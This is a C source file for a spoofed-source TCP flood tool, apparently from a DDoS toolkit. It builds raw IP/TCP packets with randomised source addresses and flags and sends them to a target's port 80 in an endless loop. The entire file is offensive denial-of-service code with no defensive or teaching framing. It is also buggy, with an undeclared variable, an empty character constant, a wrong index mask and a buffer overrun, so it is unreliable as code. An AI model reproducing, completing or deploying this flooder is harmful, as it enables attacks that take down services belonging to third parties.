#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define spoof "195.226.206.15"
//[+] UDP && TCP
#define MAX_PACKET_SIZE_UDP 4096
#define MAX_PACKET_SIZE_TCP 2048
#define openport 80
/* FUCK ME PACKET*/
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
//
/*
              Packets being sent;

*/                    
#define FUCK_ME ''
#define argg 4294967295
#define arg1 4294966669
#define arg2 4294961111
#define weed 4200000000
#define arg3 NULL
//               



static unsigned long int Q[8192], c = 654321;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeper = 100;


void init_rand(unsigned long int x){
       int i;
       Q[0] = x;
       Q[1] = x + PHI;
       Q[2] = x + PHI + PHI;

              for(i=3;i<8192;i++){
                     Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
              }
}

uint32_t cmwc(void){
       uint64_t t, a = 87822LL;
       static uint32_t i = 8192;
       uint32_t x, r = 0xfffffffe;
       //              0xffffXFXC
       //              0xffffxfxc
       //[+]---------------[+]
       i = (i + 1) & 8192;
       t = a * Q[i] + c;
       c = (t >> 32);
       x = t + c;
       if(x < c){
       x++;c++;
       }

return (Q[i] = r + x);
}

//header Checksums
unsigned short csum (unsigned short *buf, int nwords){
       unsigned long sum = 0;
       for (sum = 0; nwords > 0; nwords--)
       sum += *buf++;
       sum =  (sum >> 16) + (sum & FUCK_ME);
       sum += (sum >> 16);
       return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {

	struct tcp_pseudo{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;

	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;

	pseudohead.length=htons(sizeof(struct tcphdr));

	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);

	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;

}
void ip_header(struct iphdr *iph){
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(MAX_PACKET_SIZE_TCP);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = inet_addr(spoof);
}


void tcp_header(struct tcphdr *tcph){
    tcph->source = htons(MAX_PACKET_SIZE);
    tcph->seq = weed;
    tcph->ack_seq = rand();
    tcph->res2 = rand();
    tcph->doff = 5;
    tcph->syn = rand();
    tcph->fin = rand();
    tcph->psh = rand();
    tcph->ack = rand();
    tcph->urg = rand();
    tcph->rst = rand();
    tcph->window = rand();
    tcph->check = rand();
    tcph->urg_ptr = rand();
}

//   flood --> headers
void *flood(void *par1){

       char *td = (char *)par1;
       char datagram[MAX_PACKET_SIZE_TCP];
       struct iphdr *iph=(struct iphdr*) datagram;
       //struct tcphdr *tcph (void*) iphdr + sizeof(iphdr);
       //
       struct sockaddr_in sin;
       sin.sin_family = AF_INET;
       sin.sin_port = htons(openport);
       sin.sin_addr.s_addr = inet_addr(td);

       int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
       if (s < 0){ fprintf(stderr, "[x] Raw Socket Failed.\n"); 
       exit(-1);
       }
       memset(datagram, 0, MAX_PACKET_SIZE);
       ip_header(iph);
       tcp_header(tcph);
       iph->daddr = sin.sin_addr.s_addr;
       iph->check = csum ((unsigned short *) datagram, iph->tot_len);
       //
       int tmp = 1;
       const int *val = &tmp;

       if( setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
              fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
              exit(-1);
       }
       //
       init_rand(time(NULL));
       register unsigned int i;
       i = 0;
       while(1){
              sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));

       iph->saddr = (cmwc() >> 24 & 0xFF) << 24 | (cmwc() >> 16 & 0xFF) << 16 | (cmwc() >> 8 & 0xFF) << 8 | (cmwc() & 0xFF);
    iph->id = htonl(cmwc() & 0xFFFFFFFF);
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
    tcph->seq = cmwc() & 0xFFFF;
    tcph->source = htons(cmwc() & 0xFFFF);
    tcph->check = 0;
    tcph->check = tcpcsum(iph, tcph);       
    pps++;
       }

}





